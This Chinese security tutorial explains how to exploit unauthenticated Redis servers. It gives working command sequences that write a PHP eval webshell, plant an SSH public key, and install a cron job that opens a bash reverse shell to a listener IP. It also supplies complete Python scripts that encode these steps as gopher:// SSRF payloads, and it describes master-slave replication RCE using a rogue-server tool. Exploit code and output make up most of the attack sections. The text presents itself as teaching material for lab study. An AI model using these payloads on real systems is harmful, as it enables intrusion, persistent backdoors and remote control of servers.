原创：kale合天智汇

原创投稿活动：[重金悬赏 |
合天原创投稿等你来](http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/Nw2VDyvCpPt_GG5YKTQuUQ)

## 0X00 前言  

Redis是一个使用C编写的、基于内存的键值对存储数据库。由于数据被存储在内存中，所以拥有极快的
数据存储和读取速度，很多应用场合都用到了Redis数据库。Redis出现了很多安全问题，今天我们就Redis的安全问题进行下探讨！

### 0X01 初识Redis  

Redis的使用非常简单，我们只需要在终端输入 redis‐cli ，就可以进入Redis的交互模式。使用set，get命令进行数据库的存储和查询。

![v2-0c9bfc825413fb419d107d2f63e21dfb_hd.p](https://pic2.zhimg.com/80/v2-0c9bfc825413fb419d107d2f63e21dfb_hd.png)

我们也可以直接nc连接到6379端口进行操作

![v2-6cd5b20c7481a0599cfa5e81203de6ae_hd.p](https://pic4.zhimg.com/80/v2-6cd5b20c7481a0599cfa5e81203de6ae_hd.png)

这就意味着如果我们可以直接或者间接通过控制某个程序访问到6379端口，并且能控制部分访问内容，就可能实现任意命令执行。

Redis相关的学习可到合天网安实验室操作实验——Redis数据库安全实践，[课程:Redis数据库安全实践(合天网安实验室)](http://www.hetianlab.com/cour.do?w=1&c=C172.19.104.182015052010331700001?channelID=zhihu)

本课程将对Redis数据库及其安全攻防实践进行详细介绍，即使从未使用过Redis你的也将会对其基本操作和安全特性有一个完美的认知。

## 0X02 Redis攻击面分析  

1\. Redis未授权访问的攻击方法

Redis未授权访问的攻击由来已久，在配置错误的情况下，Redis被绑定在0.0.0.0或者暴露在公网的情况下。这个时候任何人都可以在未授权的情况下，对Redis数据库进行操作！默认安装的情况下，Redis是没有密码的。

常见的未授权攻击手段有下面几种，大多实际场景中都要与SSRF配合使用，因为现在直接暴露在公网的未授权攻击的情况越来越少了。

注：如果内网中的Redis存在未授权访问漏洞，当Redis服务以root权限运行时，利用gopher协议攻击内网中的Redis，通过写入定时任务可以实现反弹shell，相关的学习可到合天网安实验室操作实验——SSRF漏洞进阶实践-攻击内网Redis

[实验:SSRF漏洞进阶实践-攻击内网Redis(合天网安实验室)](http://www.hetianlab.com/expc.do?ec=ECID9f92-ff93-4a94-a821-f0b968ef4985?channelID=zhihu)

2\. Redis里存储的序列化数据利用

Redis中经常会存储各种序列化后的数据。Python相关的站点就可能将经过 Pickle、Yaml 序列化后的数据存储在 Redis
里。还有一些缓存的库可能就直接选择序列化后存入 Redis 中。

当Redis存在未授权攻击时，攻击者可以通过直接修改 Redis
中序列化后的数据，改为恶意payload。等待相关的程序读取该数据并反序列化该数据，反序列化时就会造成命令执行。

案例参考：https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html

3\. 使用绝对路径写webshell

这个应用场景存在较多。Redis可以通过config命令向固定路径的文件写入内容，这个功能被利用来向指定文件写入恶意内容，特别是当你的Redis是以root权限运行的情况下，这个危害祸害无穷!

我们可以通过下面的命令组合实现写shell的功能

flushall set 1 '<?php eval($_GET["123"]);?>' config set dir /var/www/html
config set dbfilename kale.php save

![v2-ee6e3c37afb0b61a88e99a40c2a45d1a_hd.p](https://pic1.zhimg.com/80/v2-ee6e3c37afb0b61a88e99a40c2a45d1a_hd.png)

![v2-4922bfe45d5dfde99eb76b51a4301026_hd.p](https://pic3.zhimg.com/80/v2-4922bfe45d5dfde99eb76b51a4301026_hd.png)

在实际场景中通常结合SSRF漏洞，如果支持Gopher协议则可以结合Gopher协议发送GET，POST请求。Gopher协议的功能和http相似，只不过它更早所以现在应用场景少了很多。

在进行之前，要把数据格式进行转换，因为Redis使用的RESP协议通信的，所以我们要把数据格式转换为RESP数据包相应的格式：https://redis.io/topics/protocol

我们使用下面的脚本进行转换

import urllib protocol="gopher://" ip="目标ip" port="6379" shell="\n\n<?php
eval($_GET[\"kale\"]);?>\n\n" filename="kale.php" path="/var/www/html"
passwd="" cmd=["flushall", "set 1 {}".format(shell.replace(" ","${IFS}")),
"config set dir {}".format(path), "config set dbfilename {}".format(filename),
"save" ] if passwd: cmd.insert(0,"AUTH {}".format(passwd))
payload=protocol+ip+":"+port+"/_" def redis_format(arr): CRLF="\r\n" redis_arr
= arr.split(" ") cmd="" cmd+="*"+str(len(redis_arr)) for x in redis_arr:
cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
cmd+=CRLF return cmd if __name__=="__main__": for x in cmd: payload +=
urllib.quote(redis_format(x)) print payload

![v2-23c7c68d101ca1d7d35eaaede6eccbeb_hd.p](https://pic2.zhimg.com/80/v2-23c7c68d101ca1d7d35eaaede6eccbeb_hd.png)

利用curl发送我们的数据包

我们直接发送会失败，因为现在新版的redis为了安全默认安装是绑定本地ip的，并且配置了安全模式

![v2-afe16a8f16cef435ccdc014827bc5a21_hd.p](https://pic2.zhimg.com/80/v2-afe16a8f16cef435ccdc014827bc5a21_hd.png)

我们修改为本地ip

成功写入

![v2-9006201c24efc5c555a2211a4444d4a0_hd.p](https://pic4.zhimg.com/80/v2-9006201c24efc5c555a2211a4444d4a0_hd.png)

4\. Redis写SSH公钥

如果你渗透的环境的Redis的是以root权限运行的，并且.ssh目录存在，我们可以尝试写入~/.ssh/authorized_keys，如果不存在的话，可以使用crontab创建。

想要成功写入还需要两个配置，一个是关闭保护模式protected-mode no，如果开启保护模式的话，未经认证的用户是不允许执行恶意命令的。

首先在自己的电脑生成公钥对，这里未设置ssh密码

ssh-keygen -t rsa

cd /root/.ssh/

(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > temp.txt

![v2-e06db193c398c04d91d51637c44fb9f5_hd.p](https://pic3.zhimg.com/80/v2-e06db193c398c04d91d51637c44fb9f5_hd.png)

把公钥写入目标机器的缓存

cat /root/.ssh/temp.txt | redis-cli -h 192.168.23.176 -x set xxx

我们可以使用以下命令组合写SSH公钥

config set dir /root/.ssh/ config set dbfilename authorized_keys save

![v2-2a55ee4821a4a7f6084a7dccd02e05e7_hd.p](https://pic3.zhimg.com/80/v2-2a55ee4821a4a7f6084a7dccd02e05e7_hd.png)

尝试无密码连接

![v2-94876def90d0fab2604a449a1402e1cf_hd.p](https://pic4.zhimg.com/80/v2-94876def90d0fab2604a449a1402e1cf_hd.png)

转化为RESP协议格式，并且使用gopher协议

import urllib protocol="gopher://" ip="目标ip" port="6379" ssh_pub="\n\nssh-rsa
AAAAB3NzaC1yc2EAAAADAQABAAABAQDFHnxKTU8is9f23Rm3+Sr3GgTlZJJXEgSRwIbRcQqEdLWxAIr6xiWFMAisuvnXC+6MKyn3Eg1FQBs9po2xeN5CtlVOG3M2IQVSTMD/PJI+bQ/i7cP47MjlHontrDgUKSN3iV1vHwT4r07f9+5o0D/F4QuyTQa5bSWTuA/nh6au27Kk/JssIVqaErLEyJelE9XdYjYUMNZfK0WetF7+kjCKkbsVEN4vJl9LPHud5fclevC/Jeshcgopiy+eToBgF9N5DiScmGysB4QQW9sEGN+/BYjn6rnY8U6GJ/2vMPk+nRpryCNP/EPN2u+noUfG0NlviScmlgf3y5uM4So75BFB
root@kali\n\n" filename="authorized_keys" path="/root/.ssh/" passwd=""
cmd=["flushall", "set 1 {}".format(ssh_pub.replace(" ","${IFS}")), "config set
dir {}".format(path), "config set dbfilename {}".format(filename), "save" ] if
passwd: cmd.insert(0,"AUTH {}".format(passwd))
payload=protocol+ip+":"+port+"/_" def redis_format(arr): CRLF="\r\n" redis_arr
= arr.split(" ") cmd="" cmd+="*"+str(len(redis_arr)) for x in redis_arr:
cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
cmd+=CRLF return cmd if __name__=="__main__": for x in cmd: payload +=
urllib.quote(redis_format(x)) print payload

生成payload

![v2-af78f1cda07804d84ed69f23f68cac8f_hd.p](https://pic1.zhimg.com/80/v2-af78f1cda07804d84ed69f23f68cac8f_hd.png)

尝试连接

![v2-01fb635992d6dbb755e4a6e5d7296d90_hd.p](https://pic4.zhimg.com/80/v2-01fb635992d6dbb755e4a6e5d7296d90_hd.png)

5\. 使用contrab计划任务反弹shell

这种方法由于权限问题，通常只能在Centos使用，Ubuntu却不行。因为默认redis写文件后是644的权限，但ubuntu要求执行定时任务文件权限必须是600，否则会报错。而Centos的定时任务执行，权限为644也可以。

Centos的定时任务文件在/var/spool/cron/，另外/etc/crontab这个文件虽然也可以执行定时任务，但是需要root，在高版本的Redis中，默认启动是以Redis权限运行的。

可以通过下列命令组合，来实现反弹shell

set 1 '\n\n*/1 * * * * bash -i >& /dev/tcp/192.168.23.176/4444 0>&1\n\n'
config set dir /var/spool/cron/ config set dbfilename root save

转化为redis RESP协议格式

import urllib protocol="gopher://" ip='192.168.23.66' port='6379'
reverse_ip="192.168.23.176" reverse_port="4444" cron="\n\n\n\n*/1 * * * * bash
-i >& /dev/tcp/%s/%s 0>&1\n\n\n\n"%(reverse_ip,reverse_port) filename="root"
path="/var/spool/cron" passwd="" cmd=["flushall", "set 1
{}".format(cron.replace(" ","${IFS}")), "config set dir {}".format(path),
"config set dbfilename {}".format(filename), "save" ] if passwd:
cmd.insert(0,"AUTH {}".format(passwd)) payload=protocol+ip+":"+port+"/_" def
redis_format(arr): CRLF="\r\n" redis_arr = arr.split(" ") cmd=""
cmd+="*"+str(len(redis_arr)) for x in redis_arr:
cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
cmd+=CRLF return cmd if __name__=="__main__": for x in cmd: payload +=
urllib.quote(redis_format(x)) print payload

生成payload，并打过去

![v2-a6de9688f440fb2f6b928580bf9280b2_hd.p](https://pic4.zhimg.com/80/v2-a6de9688f440fb2f6b928580bf9280b2_hd.png)

## 0X03 未授权攻击面临的问题  

上面三种方式主要利用了crontab、ssh
key、webshell这样的文件都有一定容错性，再加上crontab和ssh服务可以说是服务器的标准的服务，所以在以前，这种通过写入文件的getshell方式基本就可以说是很通杀了。

但是随着发展，docker兴起，而docker服务部署模式越发朝着组件化发展。一个单一redis服务的docker，可能除了Redis服务什么都没有。这种情况下就算Redis是root权限运行，这一系列写shell的操作也不能实现。更何况往往还有严格的权限限制。

## 0X04 通过主从复制 GetShell  

1\. 主从复制

Redis提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。

主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。

建立主从节点，只需要操作从节点即可，主节点，不需要任何设置。

我在一台主机上开启了两个Redis实例，一个端口为6379，一个为6860。

![v2-91fd8890170fb002ec52183e4fccf1b9_hd.p](https://pic3.zhimg.com/80/v2-91fd8890170fb002ec52183e4fccf1b9_hd.png)

我们使用SL**EOF命令将主节点的ip设置为127.0.0.1，端口为6860

![v2-0b7495bf5c6f37ca78d6309f316d8107_hd.p](https://pic3.zhimg.com/80/v2-0b7495bf5c6f37ca78d6309f316d8107_hd.png)

以上就是主从复制的过程，从节点同步复制了主节点的数据，并且完成了向用户读的功能

2\. Redis模块功能

在Reids
4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。Redis模块是动态库，可以在启动时或使用MODULE
LOAD命令加载到Redis中。是不是想到了so注入的操作。

编写恶意so文件的代码，来自github

https://github.com/RicterZ/RedisModules-ExecuteCommand

3\. 原理介绍

Pavel Toporkov在2018年的zeronights会议上分享了漏洞的原理， PPT如下:

https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf

![v2-092af97a65675b85fc60a5e3e8cdb2da_hd.p](https://pic4.zhimg.com/80/v2-092af97a65675b85fc60a5e3e8cdb2da_hd.png)

当在两个Redis实例设置主从模式的时候，Redis的主节点实例可以通过FULLRESYNC(全量复制)同步文件到从机上。我们可以在从节点上加载so文件，我们就可以执行拓展的新命令了。

4\. 漏洞复现

我们使用模拟的恶意主节点来作为主机，并模拟fullresync(全量复制)请求。就可以把so文件加载到从节点上，即我们攻击的主机！

使用脚本：https://github.com/LoRexxar/redis-rogue-server

使用本机的实例进行测试

![v2-48cc3374baefb2bc103fcd8466d067ba_hd.p](https://pic1.zhimg.com/80/v2-48cc3374baefb2bc103fcd8466d067ba_hd.png)

然后连接实例就可以执行命令

![v2-41518a78e45521aaf1b7f407f894f709_hd.p](https://pic3.zhimg.com/80/v2-41518a78e45521aaf1b7f407f894f709_hd.png)

声明：笔者初衷用于分享与普及网络知识，若读者因此作出任何危害网络安全行为后果自负，与合天智汇及原作者无关！

  

